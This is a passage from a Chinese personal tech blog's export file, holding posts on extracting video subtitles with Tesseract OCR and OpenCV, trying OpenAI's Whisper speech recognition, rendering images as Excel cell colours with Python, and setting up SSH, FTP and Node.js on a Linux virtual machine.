    <content><![CDATA[<p><em>帮朋友提取视频里的字幕，不管用语音转文字，还是OCR识别，准确率都不是很高……用Tesseract提取纯色图片还好，视频那种斑驳背景的准确率不高，英文还好，中文更是一言难尽</em></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://tesseract-ocr.cn/" target="_blank" rel="noopener">Tesseract</a>是一个开源的 文本识别 (OCR <code>Optical Character Recognition，光学字符识别</code>) 引擎。Tesseract可以通过命令行直接使用，或者使用API从图像中提取打印文本。它支持各种语言并且免费。</p>
<blockquote>
<p>官方文档：<a href="https://tesseract-ocr.cn/" target="_blank" rel="noopener">https://tesseract-ocr.cn/</a><br>GitHub地址：<a href="https://github.com/tesseract-ocr/tesseract" target="_blank" rel="noopener">https://github.com/tesseract-ocr/tesseract</a></p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载地址可以参考<a href="https://tesseract-ocr.cn/tessdoc/Downloads.html" target="_blank" rel="noopener">官方文档</a>，这里从官方提供的第三方下载Windows安装包，安装时Additional language data勾选了简体中文Chinese(Simplified)和Chinese(Simplified vertical)。<br><img src="/img/20250225/1.png" alt><br>将安装路径配置到环境变量Path<br><img src="/img/20250225/2.png" alt><br>命令提示符执行<code>tesseract -v</code>查看Tesseract版本信息<br><img src="/img/20250225/3.png" alt></p>
<h3 id="简单命令行使用"><a href="#简单命令行使用" class="headerlink" title="简单命令行使用"></a>简单命令行使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">最简单的 OCR 图像调用 tesseract + 图片 + 输出txt文件名 默认英语</span><br><span class="line">tesseract imagename outputbase</span><br><span class="line"></span><br><span class="line">-l LANG[+LANG] 指定语言</span><br><span class="line">英语</span><br><span class="line">tesseract imagename outputbase -l eng</span><br><span class="line">英语+简体中文</span><br><span class="line">tesseract imagename outputbase -l eng+chi_sim</span><br></pre></td></tr></table></figure>

<p>图片英文测试<br><img src="/img/20250225/4.png" alt><br><img src="/img/20250225/5.png" alt><br>图片中文测试<br><img src="/img/20250225/6.png" alt><br><img src="/img/20250225/7.png" alt></p>
<h3 id="视频字幕提取"><a href="#视频字幕提取" class="headerlink" title="视频字幕提取"></a>视频字幕提取</h3><p>这里使用Python，需要安装的依赖<br>OpenCV（open source computer vision library）是一个基于BSD许可（开源）发行的跨平台计算机视觉库<br><code>pip install opencv-python pytesseract difflib</code><br>我这里很久没用了，根据提示先更新了pip，然后装了opencv-python和pytesseract。difflib之前应该装过了<br><img src="/img/20250225/8.png" alt></p>
<p>直接把视频剪辑成光剩字幕，简单写个代码测试下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import cv2, pytesseract</span><br><span class="line">video = cv2.VideoCapture(&quot;test.mp4&quot;)</span><br><span class="line">success, image = video.read()</span><br><span class="line">while success:</span><br><span class="line">    text = pytesseract.image_to_string(image, lang=&apos;chi_sim&apos;)  # 中文识别</span><br><span class="line">    print(text)</span><br><span class="line">    success, image = video.read()</span><br></pre></td></tr></table></figure>

<p>结果就是识别的很差，一个“大家好”都不能准确识别<br><img src="/img/20250225/9.png" alt></p>
<p>然后录制了一个双语视频，并优化了下代码：<br>限定字幕区域，指定字幕位置（需根据视频调整坐标），避免全帧识别，提升速度和准确率。也可以动态检测字幕区域。<br>图像预处理，将字幕区域转为灰度图并二值化，增强文字对比度。<br>减少重复字幕，计算当前文本与上一帧文本的相似度，若高于阈值，视为重复内容，跳过写入。控制处理频率（如每5帧处理1帧），减少冗余计算。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import pytesseract</span><br><span class="line">from difflib import SequenceMatcher</span><br><span class="line"></span><br><span class="line"># 视频路径和输出文件路径</span><br><span class="line">video_path = &quot;input_video.wmv&quot;</span><br><span class="line">output_file = &quot;extracted_text.txt&quot;</span><br><span class="line"></span><br><span class="line"># 定义字幕区域（根据视频分辨率调整：x, y, width, height）</span><br><span class="line">#subtitle_area = (50, 900, 1800, 100)  # 示例：底部居中区域</span><br><span class="line">subtitle_area = (0, 0, 1512, 124) #我所选择视频因为截取了，就选择了整个视频大小</span><br><span class="line"></span><br><span class="line"># 初始化</span><br><span class="line">video = cv2.VideoCapture(video_path)</span><br><span class="line">prev_text = &quot;&quot;</span><br><span class="line">similarity_threshold = 0.8  # 文本相似度阈值（高于此值视为重复）</span><br><span class="line">frame_skip = 5  # 跳帧数（每隔几帧处理一帧，平衡速度与准确性）</span><br><span class="line"></span><br><span class="line">with open(output_file, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">    frame_count = 0</span><br><span class="line">    while True:</span><br><span class="line">        success, frame = video.read()</span><br><span class="line">        if not success:</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">        frame_count += 1</span><br><span class="line">        if frame_count % frame_skip != 0:</span><br><span class="line">            continue  # 跳帧处理</span><br><span class="line">        </span><br><span class="line">        # 截取字幕区域</span><br><span class="line">        x, y, w, h = subtitle_area</span><br><span class="line">        roi = frame[y:y+h, x:x+w]</span><br><span class="line">        </span><br><span class="line">        # 图像预处理（提高OCR精度）</span><br><span class="line">        gray = cv2.cvtColor(roi, cv2.COLOR_BGR2GRAY)</span><br><span class="line">        _, thresh = cv2.threshold(gray, 150, 255, cv2.THRESH_BINARY)</span><br><span class="line">        </span><br><span class="line">        # OCR识别</span><br><span class="line">        text = pytesseract.image_to_string(thresh, lang=&apos;chi_sim+eng&apos;)  # 中英文混合</span><br><span class="line">        </span><br><span class="line">        # 去空格和换行</span><br><span class="line">        text = text.strip().replace(&quot;\n&quot;, &quot; &quot;)</span><br><span class="line">        </span><br><span class="line">        # 跳过空文本</span><br><span class="line">        if not text:</span><br><span class="line">            continue</span><br><span class="line">        </span><br><span class="line">        # 计算与上一帧文本的相似度</span><br><span class="line">        similarity = SequenceMatcher(None, prev_text, text).ratio()</span><br><span class="line">        if similarity &lt; similarity_threshold:</span><br><span class="line">            f.write(f&quot;&#123;text&#125;\n&quot;)</span><br><span class="line">            prev_text = text  # 更新前一次文本</span><br><span class="line"></span><br><span class="line">video.release()</span><br><span class="line">print(f&quot;文字已提取到 &#123;output_file&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>最终效果如下，中文依旧不尽人意，英语准确率很高<br><img src="/img/20250225/10.png" alt><br>这里只是简单尝试，如何提高准确率，可以根据视频情况，调整图像处理方式，以及增加纠错处理等等。或者更换OCR引擎，听说PaddleOCR对中文支持更好。</p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>OCR</tag>
        <tag>Tesseract</tag>
      </tags>
  </entry>
  <entry>
    <title>浅试OpenAI免费开源通用语音识别模型Whisper</title>
    <url>/2023/04/10/%E6%B5%85%E8%AF%95OpenAI%E5%85%8D%E8%B4%B9%E5%BC%80%E6%BA%90%E9%80%9A%E7%94%A8%E8%AF%AD%E9%9F%B3%E8%AF%86%E5%88%AB%E6%A8%A1%E5%9E%8BWhisper/</url>
    <content><![CDATA[<p><em>今年终于度过了忙碌的时期，可以搞搞自己感兴趣的事情了。最近OpenAI的ChatGPT挺火的，就简单尝试了下这个公司开源的Whisper（偶然看到的）。</em></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><img src="/img/20230410/1.png" alt><br><a href="https://openai.com/research/whisper" target="_blank" rel="noopener">Whisper</a>是一个由OpenAI训练并开源的神经网络，该神经网络在英语语音识别方面的稳健性和准确性接近人类水平。<br>Whisper是一种自动语音识别(ASR)系统，基于从网络上收集的680000多小时的语言数据进行训练，支持99种不同语言的转录以及将这些语言翻译成英语，能够生成带时间轴的字幕文件。<br>有兴趣的可以看看<a href="https://github.com/openai/whisper" target="_blank" rel="noopener">代码</a>和<a href="https://cdn.openai.com/papers/whisper.pdf" target="_blank" rel="noopener">论文</a>（我是看不懂）。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Whisper可以离线，本地化部署。以Win10为例，需要电脑有Python环境（直接用安装包安装即可，这里省略）。</p>
<p>下载并安装（或更新到）最新版本的Whisper<br><code>pip install -U openai-whisper</code><br>或者用以下命令从GitHub中提取并安装最新版的Whisper<br><code>pip install git+https://github.com/openai/whisper.git</code><br><img src="/img/20230410/2.png" alt></p>
<blockquote>
<p>ps:用这个安装的话，提示git命令无效的话，用pip安装Git会提示找不到版本，Windows系统建议直接自己下载安装Git就好。或者用<code>choco</code>来装，如果有装的话。<br><img src="/img/20230410/3.png" alt></p>
</blockquote>
<p>安装ffmpeg，用于读取音频</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># on Ubuntu or Debian</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install ffmpeg</span><br><span class="line"></span><br><span class="line"># on Arch Linux</span><br><span class="line">sudo pacman -S ffmpeg</span><br><span class="line"></span><br><span class="line"># on MacOS using Homebrew (https://brew.sh/)</span><br><span class="line">brew install ffmpeg</span><br><span class="line"></span><br><span class="line"># on Windows using Chocolatey (https://chocolatey.org/)</span><br><span class="line">choco install ffmpeg</span><br><span class="line"></span><br><span class="line"># on Windows using Scoop (https://scoop.sh/)</span><br><span class="line">scoop install ffmpeg</span><br></pre></td></tr></table></figure>

<p>因为电脑里没有Chocolatey和Scoop，就直接从<a href="https://ffmpeg.org/" target="_blank" rel="noopener">FFmpe官网</a>上直接下载了，然后配置环境变量好了。<br><img src="/img/20230410/4.png" alt></p>
<p>安装rust，以防tokenizer无法为您的平台提供预构建的轮子<br><code>pip install setuptools-rust</code><br><img src="/img/20230410/5.png" alt></p>
<h3 id="主要命令参数"><a href="#主要命令参数" class="headerlink" title="主要命令参数"></a>主要命令参数</h3><h4 id="help"><a href="#help" class="headerlink" title="help"></a>help</h4><p><code>whisper --help</code>查看所有可用选项</p>
<h4 id="task"><a href="#task" class="headerlink" title="task"></a>task</h4><p><code>--task</code>分为<code>transcribe</code>（语音转录，默认）和<code>translate</code>（翻译，只支持英文）</p>
<h4 id="language"><a href="#language" class="headerlink" title="language"></a>language</h4><p><code>--language</code>设置语音转录的语种（范围详见：<a href="https://github.com/openai/whisper/blob/main/whisper/tokenizer.py" target="_blank" rel="noopener">tokenizer.py</a>，默认截取音频的前30秒来判断语种），如指定日语<code>--language Japanese</code></p>
<h4 id="model"><a href="#model" class="headerlink" title="model"></a>model</h4><p><code>--model</code>设置转录模型。官方提供5种模型，转录效果为 <code>tiny</code> &lt; <code>base</code> &lt; <code>small</code> &lt; <code>medium</code> &lt; <code>large</code>，转录时间也会变长（英文视频转录则在模型参数上添加后缀<code>.en</code>来提高转录速度，默认使用默认使用small）。</p>
<table>
<thead>
<tr>
<th align="center">模型</th>
<th align="center">大小</th>
<th align="center">单英语模型</th>
<th align="center">多语言模型</th>
<th align="center">最低显存</th>
<th align="center">转录速率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">tiny</td>
<td align="center">39 M</td>
<td align="center">tiny.en</td>
<td align="center">tiny</td>
<td align="center">~1 GB</td>
<td align="center">~32x</td>
</tr>
<tr>
<td align="center">base</td>
<td align="center">74 M</td>
<td align="center">base.en</td>
<td align="center">base</td>
<td align="center">~1 GB</td>
<td align="center">~16x</td>
</tr>
<tr>
<td align="center">small</td>
<td align="center">244 M</td>
<td align="center">small.en</td>
<td align="center">small</td>
<td align="center">~2 GB</td>
<td align="center">~6x</td>
</tr>
<tr>
<td align="center">medium</td>
<td align="center">769 M</td>
<td align="center">medium.en</td>
<td align="center">medium</td>
<td align="center">~5 GB</td>
<td align="center">~2x</td>
</tr>
<tr>
<td align="center">large</td>
<td align="center">1550 M</td>
<td align="center">N/A</td>
<td align="center">large</td>
<td align="center">~10 GB</td>
<td align="center">1x</td>
</tr>
</tbody></table>
<p>第一次使用会先下载模型，模型默认本地存放路径为<code>C:\Users\&lt;username&gt;\.cache\whisper\&lt;model&gt;</code></p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>Whisper的表现因语言而异，因为笔记本没有GPU，我只尝试了对日语，tiny和small两个模型，结果如下：</p>
<p>tiny根据停顿断句，速度快但是准确率堪忧。最后生成<code>.json</code>，<code>.srt</code>，<code>.tsv</code>, <code>.txt</code>, <code>.vtt</code>文件。<br><code>whisper &quot;西川貴教 - Meteor‐ミーティア‐.mp3&quot; --model tiny --language Japanese</code><br><img src="/img/20230410/6.png" alt></p>
<p>small断句不错，准确率也很高，但是慢点（我用cpu没跑完就停了）。<br><code>whisper &quot;西川貴教 - Meteor‐ミーティア‐.mp3&quot; --model small --language Japanese</code><br><img src="/img/20230410/7.png" alt></p>
<p>Whisper除了完美的英语转录效果相比，其他语言还有很大的提升空间，但是生成的字幕文件，大大减少了时间轴的调整，以及文案校对的工作量。加上机翻，自己手动做字幕不是梦。</p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>Whisper</tag>
      </tags>
  </entry>
  <entry>
    <title>补完-用Excel复原图片（单元格替代像素 娱乐用）</title>
    <url>/2025/03/29/%E8%A1%A5%E5%AE%8C-%E7%94%A8Excel%E5%A4%8D%E5%8E%9F%E5%9B%BE%E7%89%87%EF%BC%88%E5%8D%95%E5%85%83%E6%A0%BC%E6%9B%BF%E4%BB%A3%E5%83%8F%E7%B4%A0%20%E5%A8%B1%E4%B9%90%E7%94%A8%EF%BC%89/</url>
    <content><![CDATA[<p><em>起因是在朋友建议下开始看数据分析相关教程，在看到numpy时，发现可以用来存取图像像素数据。很早之前有过把图片在Excel中表示的想法，就是通过单元格背景色来替代像素，当时想用VBA来的吧，但是最终没有实现，于是现在用Python来补完当初的想法</em></p>
<h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>NumpPy：Python中用于科学计算的核心库<br>Pillow：图像处理库<br>OpenPyXL：操作Excel文件的第三方库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install numpy pillow openpyxl</span><br></pre></td></tr></table></figure>

<p><img src="/img/20250329/1.png" alt><br>这里NumpPy和Pillow安装过了，忘了是不是自己安装的了。</p>
<h3 id="简易尝试"><a href="#简易尝试" class="headerlink" title="简易尝试"></a>简易尝试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line">import openpyxl</span><br><span class="line">from openpyxl.styles import PatternFill</span><br><span class="line">from openpyxl.utils import get_column_letter</span><br><span class="line"></span><br><span class="line">def image_to_excel(image_path, output_file):</span><br><span class="line">    # 读取图片并转换为numpy数组</span><br><span class="line">    img = Image.open(image_path)</span><br><span class="line">    img_array = np.array(img)</span><br><span class="line">    height, width = img_array.shape[:2]</span><br><span class="line"></span><br><span class="line">    # 创建Excel工作簿</span><br><span class="line">    wb = openpyxl.Workbook()</span><br><span class="line">    ws = wb.active</span><br><span class="line"></span><br><span class="line">    # 设置单元格为正方形</span><br><span class="line">    for row in range(1, height+1):</span><br><span class="line">        ws.row_dimensions[row].height = 1.5  # 行高（单位：点）</span><br><span class="line">    </span><br><span class="line">    for col in range(1, width+1):</span><br><span class="line">        col_letter = get_column_letter(col)</span><br><span class="line">        ws.column_dimensions[col_letter].width = 0.25  # 列宽（单位：字符）</span><br><span class="line"></span><br><span class="line">    # 遍历每个像素设置颜色</span><br><span class="line">    for y in range(height):</span><br><span class="line">        for x in range(width):</span><br><span class="line">            # 获取像素RGB值（忽略alpha通道）</span><br><span class="line">            r, g, b = img_array[y, x, :3]</span><br><span class="line">            </span><br><span class="line">            # 转换为Excel的ARGB十六进制格式</span><br><span class="line">            hex_color = &quot;&#123;0:02X&#125;&#123;1:02X&#125;&#123;2:02X&#125;&quot;.format(r, g, b)</span><br><span class="line">            </span><br><span class="line">            # 创建填充样式</span><br><span class="line">            fill = PatternFill(</span><br><span class="line">                start_color=hex_color,</span><br><span class="line">                end_color=hex_color,</span><br><span class="line">                fill_type=&apos;solid&apos;</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            # 设置单元格填充</span><br><span class="line">            cell = ws.cell(row=y+1, column=x+1)</span><br><span class="line">            cell.fill = fill</span><br><span class="line"></span><br><span class="line">    # 保存文件</span><br><span class="line">    wb.save(output_file)</span><br><span class="line">    print(f&quot;文件已保存至：&#123;output_file&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    input_image = &quot;input.png&quot;  # 输入图片路径</span><br><span class="line">    output_excel = &quot;output.xlsx&quot;  # 输出Excel路径</span><br><span class="line">    image_to_excel(input_image, output_excel)</span><br></pre></td></tr></table></figure>

<p>执行效果：<br><img src="/img/20250329/2.png" alt></p>
<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><ol>
<li>图片尺寸限制：Excel最大支持1048576行×16384列。但是实际远远达不到这个大小，Excel就无法正常打开了……尝试了很多，最终也无法解决，也没有尝试出阈值，就把图片大小限定在500*500像素以内了，实际上支持的更多。<br>文件无法正常打开，修复后单元格背景色丢失：<br><img src="/img/20250329/3.png" alt><br>尝试能正常打开阈值：<br><img src="/img/20250329/4.png" alt></li>
<li>支持透明通道处理（Alpha 通道）。</li>
<li>增加进度条，性能优化。</li>
</ol>
<p>完整代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line">import openpyxl</span><br><span class="line">import sys</span><br><span class="line">import gc</span><br><span class="line">from openpyxl.styles import PatternFill</span><br><span class="line">from openpyxl.utils import get_column_letter</span><br><span class="line">from openpyxl.cell import WriteOnlyCell</span><br><span class="line"></span><br><span class="line"># 内存优化配置</span><br><span class="line">gc.enable()</span><br><span class="line">gc.set_threshold(1000, 10, 10)</span><br><span class="line"></span><br><span class="line">MAX_ROWS = 500 #1048576</span><br><span class="line">MAX_COLS = 500 #16384</span><br><span class="line">DEFAULT_BG = (255, 255, 255)</span><br><span class="line"></span><br><span class="line">def alpha_blend(foreground, background):</span><br><span class="line">    #向量化Alpha混合</span><br><span class="line">    alpha = foreground[..., 3].astype(np.float32) / 255.0</span><br><span class="line">    alpha = np.expand_dims(alpha, axis=-1)</span><br><span class="line">    </span><br><span class="line">    bg_array = np.full(foreground.shape[:2] + (3,), background, dtype=np.uint16)</span><br><span class="line">    blended = foreground[..., :3].astype(np.uint16) * alpha + bg_array * (1 - alpha)</span><br><span class="line">    return np.clip(blended, 0, 255).astype(np.uint8)</span><br><span class="line"></span><br><span class="line">def image_to_excel(image_path, output_file, bg_color=DEFAULT_BG):</span><br><span class="line">    # 颜色缓存字典</span><br><span class="line">    color_cache = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    with Image.open(image_path) as img:</span><br><span class="line">        rgba_img = img.convert(&apos;RGBA&apos;)</span><br><span class="line">        width, height = rgba_img.size</span><br><span class="line">        </span><br><span class="line">        if width &gt; MAX_COLS or height &gt; MAX_ROWS:</span><br><span class="line">            raise ValueError(f&quot;图片尺寸超过Excel限制（最大&#123;MAX_COLS&#125;x&#123;MAX_ROWS&#125;）&quot;)</span><br><span class="line">        </span><br><span class="line">        # 创建写优化工作簿</span><br><span class="line">        wb = openpyxl.Workbook(write_only=True)</span><br><span class="line">        ws = wb.create_sheet()</span><br><span class="line">        </span><br><span class="line">        # 设置列宽</span><br><span class="line">        for col_idx in range(width):</span><br><span class="line">            ws.column_dimensions[get_column_letter(col_idx + 1)].width = 0.25</span><br><span class="line">        # 设置行高</span><br><span class="line">        for row in range(1, height + 1):</span><br><span class="line">            ws.row_dimensions[row].height = 1.5  # 行高</span><br><span class="line">        </span><br><span class="line">        # 转换图像数据</span><br><span class="line">        img_array = np.array(rgba_img)</span><br><span class="line">        blended = alpha_blend(img_array, bg_color)</span><br><span class="line">        </span><br><span class="line">        # 批量处理行数据</span><br><span class="line">        total_pixels = height * width</span><br><span class="line">        processed = 0</span><br><span class="line">        </span><br><span class="line">        for y in range(height):</span><br><span class="line">            row = []</span><br><span class="line">            for x in range(width):</span><br><span class="line">                r, g, b = blended[y, x]</span><br><span class="line">                hex_color = f&quot;&#123;r:02X&#125;&#123;g:02X&#125;&#123;b:02X&#125;&quot;</span><br><span class="line">                </span><br><span class="line">                # 创建单元格并应用缓存样式</span><br><span class="line">                cell = WriteOnlyCell(ws, value=&quot;&quot;)</span><br><span class="line">                if hex_color not in color_cache:</span><br><span class="line">                    color_cache[hex_color] = PatternFill(</span><br><span class="line">                        start_color=hex_color,</span><br><span class="line">                        end_color=hex_color,</span><br><span class="line">                        fill_type=&apos;solid&apos;</span><br><span class="line">                    )</span><br><span class="line">                cell.fill = color_cache[hex_color]</span><br><span class="line">                row.append(cell)</span><br><span class="line">                </span><br><span class="line">                # 进度跟踪</span><br><span class="line">                processed += 1</span><br><span class="line">                if processed % 10000 == 0:</span><br><span class="line">                    sys.stdout.write(f&quot;\r处理进度: &#123;processed&#125;/&#123;total_pixels&#125; (&#123;processed/total_pixels:.1%&#125;)&quot;)</span><br><span class="line">                    sys.stdout.flush()</span><br><span class="line">            </span><br><span class="line">            # 添加行并设置行高</span><br><span class="line">            ws.append(row)</span><br><span class="line">            #ws.row_dimensions[y + 1].height = 1</span><br><span class="line">        </span><br><span class="line">        # 分块保存（处理大文件）</span><br><span class="line">        try:</span><br><span class="line">            wb.save(output_file)</span><br><span class="line">            print(f&quot;\n文件保存成功: &#123;output_file&#125;&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;\n保存失败: &#123;str(e)&#125;&quot;)</span><br><span class="line">            raise</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    import argparse</span><br><span class="line">    parser = argparse.ArgumentParser(description=&apos;高性能图片转Excel工具&apos;)</span><br><span class="line">    parser.add_argument(&apos;input&apos;, help=&apos;输入图片路径&apos;)</span><br><span class="line">    parser.add_argument(&apos;-o&apos;, &apos;--output&apos;, default=&apos;output.xlsx&apos;, help=&apos;输出文件路径&apos;)</span><br><span class="line">    parser.add_argument(&apos;-b&apos;, &apos;--background&apos;, nargs=3, type=int, default=DEFAULT_BG,</span><br><span class="line">                      metavar=(&apos;R&apos;, &apos;G&apos;, &apos;B&apos;), help=&apos;背景颜色 (默认: 255 255 255)&apos;)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        print(f&quot;处理中: &#123;args.input&#125;&quot;)</span><br><span class="line">        image_to_excel(args.input, args.output, tuple(args.background))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;错误发生: &#123;str(e)&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>执行效果如下：<br><img src="/img/20250329/5.png" alt></p>
]]></content>
      <tags>
        <tag>Excel</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机模拟Linux服务器</title>
    <url>/2020/02/07/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A8%A1%E6%8B%9FLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h1 id="虚拟机模拟Linux服务器"><a href="#虚拟机模拟Linux服务器" class="headerlink" title="虚拟机模拟Linux服务器"></a>虚拟机模拟Linux服务器</h1><p><em>通过虚拟机简单模拟通过SSH远程连接Linux服务器，实际上服务器需要很多配置，比如安全方面。</em></p>
<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><ul>
<li>服务器（虚拟机） VMware（习惯用这个但是收费，可以用免费的VirtualBox）</li>
<li>Linux操作系统：deepin-15.11-amd64（下的最新版的深度系统，amd？我intel的cpu）</li>
<li>连接工具：MobaXterm（Putty，TeraTerm，Xshell都可以），</li>
<li>文件传输：FileZilla Client（或WinSCP）</li>
</ul>
<hr>
<h4 id="服务器搭建"><a href="#服务器搭建" class="headerlink" title="服务器搭建"></a>服务器搭建</h4><ol>
<li><p>虚拟机安装（略）<br><img src="/img/20200207/1.jpg" alt><br>下载完镜像，挂载安装就好了。查看宿主机能否ping通虚拟机（我装完就是通的），如果不能，调整虚拟机网络设置。<br>这里可以在linux里手动设定ip，我因为是动态获取的，后来ip自己变了。但是手动后发现有时候网络不通，导致后面的npm install安装不了……<br><img src="/img/20200207/2.png" alt></p>
</li>
<li><p>Linux配置<br>查看是否安装了openssh-server服务（新装deepin系统没有），刚开始跑偏了，用yum来装的，发现没有yum命令，就用sudo apt-get来安装yum，然后发现yum没有已启用的仓库（需要配置yum仓库）……。<br><img src="/img/20200207/3.png" alt></p>
<blockquote>
<p>apt-get 与 yum安装区别：<br>Linux一般分为两大类<br>RedHat系列：Redhat、Centos、Fedora等 安装包格式 rpm包 包管理工具 yum<br>Debian系列：Debian、Ubuntu、Deepin等 安装包格式 deb包 包管理工具 apt-get</p>
</blockquote>
</li>
</ol>
<div align="center">⬇从这开始⬇</div>

<p>deepin新建用户非root用户，如需要root权限需要执行<code>sudo passwd root</code>设置root密码激活</p>
<p>安装SSH服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure>

<p>更改配置文件，这里只改了默认端口Port 22（不安全最好改，可以忽略）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200207/4.jpg" alt></p>
<blockquote>
<p>vim文本编辑器 输入模式（ESC键退出）</p>
<blockquote>
<p>i光标所在字符前开始插入<br>a光标所在字符后开始插入<br>o光标所在行的下面另起一新行插入<br>s删除光标所在的字符并开始插入<br>I光标所在行的行首开始插入 如果行首有空格则在空格之后插入<br>A光标所在行的行尾开始插入<br>O光标所在行的上面另起一行开始插入<br>S删除光标所在行并开始插入</p>
</blockquote>
<p>vim保存退出</p>
<blockquote>
<p>:q 回车退出<br>:w 保存<br>:wq 保存退出<br>！ 强制，比如 :q! 改动过:q会提示已修改但尚未保存（可用！强制执行）<br>:e！恢复上次编辑保存的文件状态</p>
</blockquote>
</blockquote>
<p>修改配置文件后需要重新启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>

<p>另外可以安装带用户界面的防火墙<code>sudo apt-get install gufw</code>(deepin默认没有, ufw不带用户界面)来增加安全性</p>
<ol start="3">
<li>远程连接Linux<br>在MobaXterm中新建session，输入IP地址，用户名，端口后点OK连接。<br><img src="/img/20200207/5.jpg" alt><br>然后根据提示输入密码，效果如下，我通过“远程”在桌面新建了一个linkstart的文件夹。<br><img src="/img/20200207/6.jpg" alt><br>另外SSH建立成功可以直接使用sftp来传输文件。<br><img src="/img/20200207/7.png" alt></li>
</ol>
<hr>
<h4 id="搭建FTP服务器"><a href="#搭建FTP服务器" class="headerlink" title="搭建FTP服务器"></a>搭建FTP服务器</h4><p>这个不知道啥原因，晚上弄了好久也没弄成功，第二天重新装了vsftpd就自己好了(现在怀疑是ip地址变了)……</p>
<ul>
<li><p>安装vsftpd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vsftpd</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置主配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd.conf</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>配置有很多（不是很了解），这里只改默认端口21为1121，文件末尾增加<code>listen_port=1121</code>即可。<br>如何想要上传文件，需要把<code>write_enable=YES</code>注释#去掉。</p>
<ul>
<li>修改标准端口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/services</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>把21端口改为1121<br><img src="/img/20200207/8.jpg" alt></p>
<ul>
<li>重启服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/vsftpd restart</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>然后就可以通过ftp来连接了。<br><img src="/img/20200207/9.png" alt></p>
<hr>
<h4 id="服务器部署（Hexo博客）"><a href="#服务器部署（Hexo博客）" class="headerlink" title="服务器部署（Hexo博客）"></a>服务器部署（Hexo博客）</h4><p>简单地在linux里装了Hexo的环境，这个要根据实际情况来部署Tomcat之类。<br>因为Hexo基于Node.js，先在本地下载好Linux Binaries (x64)的安装包，通过ftp上传到Linux服务器。<br>cd到上传目录，通过tar命令解压。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xf node-v12.15.0-linux-x64.tar.xz</span><br></pre></td></tr></table></figure>

<p>进入到解压后的文件夹,设置node和npm为全局变量（软链接，前面是解压文件位置）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s /home/xuchunlei/Desktop/linkstart/ftp/node-v12.15.0-linux-x64/bin/node /usr/local/bin/node</span><br><span class="line">ln -s /home/xuchunlei/Desktop/linkstart/ftp/node-v12.15.0-linux-x64/bin/npm /usr/local/bin/npm</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Linux链接分两种</p>
<blockquote>
<p>硬链接（Hard Link），通过索引节点来进行连接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在Linux中，多个文件名指向同一索引节点是存在的。<br>ln f1 f2 #创建f1的一个硬连接文件f2，f1和f2节点相同</p>
</blockquote>
<blockquote>
<p>符号连接（Symbolic Link），也叫软连接，类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。<br>ln -s f1 f3 #创建f1的一个符号连接文件f3，f1和f3节点不同</p>
</blockquote>
</blockquote>
<p>安装Git和Hexo,设置hexo为全局变量</p>
